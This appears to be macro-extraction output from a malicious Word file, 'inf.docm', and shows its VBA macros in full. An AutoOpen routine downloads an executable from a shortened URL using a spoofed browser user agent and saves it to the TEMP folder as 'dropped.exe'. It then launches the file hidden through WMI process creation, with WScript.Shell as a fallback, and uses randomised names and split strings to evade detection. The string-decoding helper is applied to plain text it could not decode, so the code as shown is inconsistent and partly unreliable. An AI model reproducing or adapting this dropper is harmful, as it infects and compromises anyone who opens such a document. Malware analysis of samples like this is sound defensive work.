===============================================================================
FILE: inf.docm
Type: OpenXML
-------------------------------------------------------------------------------

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub avscuqctk()
Dim vxedylctlyqvkl As String
Dim yxxqowke As String
Dim yqlcangepvrccrx As Object, tmffoscpfdripcxpd As Object
Dim afcbydld As Integer
vxedylctlyqvkl = hgmneqolwgxg("https://tin") & hgmneqolwgxg("yurl.com/g2z2gh6f")
yxxqowke = hgmneqolwgxg("dro") & hgmneqolwgxg("pped.exe")
yxxqowke = Environ("TEMP") & "\" & yxxqowke
Set yqlcangepvrccrx = CreateObject(hgmneqolwgxg("MSXML2.") & hgmneqolwgxg("ServerXMLHTTP.6.0"))
yqlcangepvrccrx.setOption(2) = 13056
yqlcangepvrccrx.Open hgmneqolwgxg("GET"), vxedylctlyqvkl, False
yqlcangepvrccrx.setRequestHeader hgmneqolwgxg("Use") & hgmneqolwgxg("r-Agent"), hgmneqolwgxg("Mozilla/4.0 (compa") & hgmneqolwgxg("tible; MSIE 6.0; Windows NT 5.0)")
yqlcangepvrccrx.Send
If yqlcangepvrccrx.Status = 200 Then
Set tmffoscpfdripcxpd = CreateObject(hgmneqolwgxg("ADO") & hgmneqolwgxg("DB.Stream"))
tmffoscpfdripcxpd.Open
tmffoscpfdripcxpd.Type = 1
tmffoscpfdripcxpd.Write yqlcangepvrccrx.ResponseBody
tmffoscpfdripcxpd.SaveToFile yxxqowke, 2
tmffoscpfdripcxpd.Close
jausltewrjghdtvi yxxqowke
End If
End Sub
Sub AutoOpen()
avscuqctk
End Sub
Private Function hgmneqolwgxg(ByVal mynmavyclwok As String) As String
Dim ejdwyblxvgpy As Long
For ejdwyblxvgpy = 1 To Len(mynmavyclwok) Step 2
hgmneqolwgxg = hgmneqolwgxg & Chr$(Val("&H" & Mid$(mynmavyclwok, ejdwyblxvgpy, 2)))
Next ejdwyblxvgpy
End Function

-------------------------------------------------------------------------------
VBA MACRO cuabumrbh.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cuabumrbh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub txsctapysvyvh(xflqpurtgr As String)
CreateObject(jmkrohkvctnt("WScript.Shel") & jmkrohkvctnt("l")).Run xflqpurtgr, 0
End Sub
Private Function jmkrohkvctnt(ByVal vgqofbnoswth As String) As String
Dim nfwbabqqwqxf As Long
For nfwbabqqwqxf = 1 To Len(vgqofbnoswth) Step 2
jmkrohkvctnt = jmkrohkvctnt & Chr$(Val("&H" & Mid$(vgqofbnoswth, nfwbabqqwqxf, 2)))
Next nfwbabqqwqxf
End Function

-------------------------------------------------------------------------------
VBA MACRO cwzbjoiuq.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/cwzbjoiuq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub jausltewrjghdtvi(tibgkzhn As String)
On Error Resume Next
Err.Clear
wimResult = kshliitwryv(tibgkzhn)
If Err.Number <> 0 Or wimResult <> 0 Then
Err.Clear
txsctapysvyvh tibgkzhn
End If
On Error GoTo 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO lkxosgcqm.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function kshliitwryv(cmdLine As String) As Integer
Set rpmcsqkfmmefrk = GetObject(lylhbzknnnzm("winmgmt") & lylhbzknnnzm("s:\\.\root\cimv2"))
Set apcpmobozbywheter = rpmcsqkfmmefrk.Get(lylhbzknnnzm("Win32_Proce") & lylhbzknnnzm("ssStartup"))
Set ojuovddfgrz = apcpmobozbywheter.SpawnInstance_
ojuovddfgrz.ShowWindow = 0
Set jcjvmxzi = GetObject(lylhbzknnnzm("winmgmts:\\.\root\cimv2:W") & lylhbzknnnzm("in32_Process"))
kshliitwryv = jcjvmxzi.Create(cmdLine, Null, ojuovddfgrz, intProcessID)
End Function
Private Function lylhbzknnnzm(ByVal wawaggaffhsu As String) As String
Dim uuhcyhapguna As Long
For uuhcyhapguna = 1 To Len(wawaggaffhsu) Step 2
lylhbzknnnzm = lylhbzknnnzm & Chr$(Val("&H" & Mid$(wawaggaffhsu, uuhcyhapguna, 2)))
Next uuhcyhapguna
End Function
